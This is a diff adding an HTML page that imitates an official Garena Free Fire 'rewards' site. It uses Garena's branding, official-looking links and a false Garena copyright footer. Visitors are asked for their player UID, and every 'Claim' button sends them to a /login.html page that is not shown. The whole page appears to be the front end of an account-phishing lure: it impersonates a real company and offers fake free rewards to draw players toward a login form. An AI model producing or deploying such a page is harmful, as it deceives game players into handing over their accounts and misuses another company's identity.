@@ -1,0 +1,217 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <title>Free Fire Rewards</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }html, body {
+        width: 100%;
+        height: 100%;
+        overflow-x: hidden;
+    }
+
+    body {
+        background: url('free-fire-hayato-gaming-poster-5vxwt64adks0n1ny.jpg') no-repeat center center fixed;
+        background-size: cover;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: flex-start;
+        min-height: 100vh;
+    }
+
+    #banner {
+        width: 100%;
+        display: block;
+        margin-bottom: 20px;
+    }
+
+    video {
+        width: 100%;
+        display: block;
+        margin-bottom: 20px;
+    }
+
+    .search-container {
+        position: relative;
+        margin-bottom: 20px;
+    }
+
+    .uid-input {
+        padding: 10px 15px;
+        font-size: 16px;
+        border: 2px solid #FFD700;
+        border-radius: 8px;
+        background-color: white;
+        outline: none;
+        width: calc(100% - 60px);
+    }
+
+    .search-btn {
+        position: absolute;
+        right: 0;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+    }
+
+    .search-btn img {
+        width: 60px;
+        height: auto;
+    }
+
+    .image-grid-container {
+        background-color: black;
+        border: 2px solid white;
+        border-radius: 12px;
+        box-shadow: 4px 4px 12px rgba(0, 0, 0, 0.7);
+        padding: 20px;
+        margin-top: 20px;
+    }
+
+    .image-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 20px;
+        max-width: 1200px;
+        justify-content: center;
+    }
+
+    @media (min-width: 768px) {
+        .image-grid {
+            grid-template-columns: repeat(4, 1fr);
+        }
+    }
+
+    .image-container {
+        text-align: center;
+    }
+
+    .image-container img {
+        width: 100%;
+        height: auto;
+        display: block;
+    }
+
+    .claim-btn {
+        width: 100%;
+        cursor: pointer;
+        transition: transform 0.1s ease;
+    }
+
+    .claim-btn:active {
+        transform: scale(0.95);
+    }
+
+    .footer {
+        width: 100%;
+        margin-top: 60px;
+        text-align: center;
+        color: white;
+        font-size: 14px;
+        padding: 20px 0;
+        background: rgba(0, 0, 0, 0.8);
+        border-top: 2px solid #FFD700;
+    }
+
+    .footer-links a {
+        color: #FFD700;
+        text-decoration: none;
+        margin: 0 10px;
+    }
+
+    .footer-links a:hover {
+        color: #FFA500;
+    }
+
+    .social-links img {
+        width: 28px;
+        height: auto;
+    }
+
+</style>
+
+</head><body><!-- Banner -->
+<a href="https://ff.garena.com" target="_blank">
+  <!--Tab to edit-->
+<img 
+id="banner" src="banner.jpg" alt="banner">
+
+</a>
+<!-- Video Section -->
+<video autoplay loop muted id="promo-video">
+    <source src="Garena_Free_Fire____Garena_Free_Fire_trailer____Trailer_Garena_Free_Fire.....(360p).mp4" type="video/mp4">
+    Your browser does not support the video tag.
+</video>
+
+<!-- Input Box with Search Button -->
+<div class="search-container">
+    <input type="text" class="uid-input" placeholder="Add UID">
+    <div class="search-btn" onclick="playClickSound()">
+        <img src="search.jpg" alt="Search">
+    </div>
+</div>
+
+<!-- Image Grid Container -->
+<div class="image-grid-container">
+    <div class="image-grid" id="image-grid">
+        <!-- Dynamic Image Grid -->
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <p>&copy; 2025 Garena International. All Rights Reserved.</p>
+    <div class="footer-links">
+        <a href="https://ff.garena.com" target="_blank">Privacy Policy</a> |
+        <a href="https://ffsupport.garena.com" target="_blank">Customer Support</a> |
+        <a href="https://ff.garena.com" target="_blank">Terms of Service</a>
+    </div>
+</div>
+
+<!-- Audio for Click Sound -->
+<audio id="click-sound" src="/click.wav"></audio>
+
+<script>
+    document.body.addEventListener('click', playClickSound);
+
+    function playClickSound() {
+        const clickSound = document.getElementById('click-sound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+    }
+
+    document.getElementById('promo-video').volume = 0.3; // Set video volume to 30%
+
+    // Dynamically populate image grid
+    const images = [
+        'IMG_20250323_195500_917.jpg', 'IMG_20250327_195846_274.jpg', 'IMG_20250327_195848_154.jpg',
+        'IMG_20250327_195850_443.jpg', 'IMG_20250327_195853_071.jpg', 'IMG_20250327_195855_021.jpg',
+        'Screenshot_20250327_192139_Gallery.jpg', 'Screenshot_20250327_192316_Gallery.jpg',
+        'Screenshot_20250327_192442_Gallery.jpg', 'Screenshot_20250327_192528_Gallery.jpg',
+        'Screenshot_20250327_192649_Gallery.jpg', 'Screenshot_20250327_200459_Gallery.jpg'
+    ];
+
+    const grid = document.getElementById('image-grid');
+    images.forEach(src => {
+        const container = document.createElement('div');
+        container.className = 'image-container';
+        container.innerHTML = `<img src="${src}" alt="Reward"><img class="claim-btn" src="button.jpg" alt="Claim">`;
+        grid.appendChild(container);
+    });
+
+    // Add click event listeners to all claim buttons
+    document.querySelectorAll('.claim-btn').forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.stopPropagation(); // Prevent the body click event from triggering
+            playClickSound();
+            // Redirect after a small delay to allow sound to play
+            setTimeout(() => {
+                window.location.href = '/login.html';
+            }, 300);
+        });
+    });
+</script>
+</body></html>
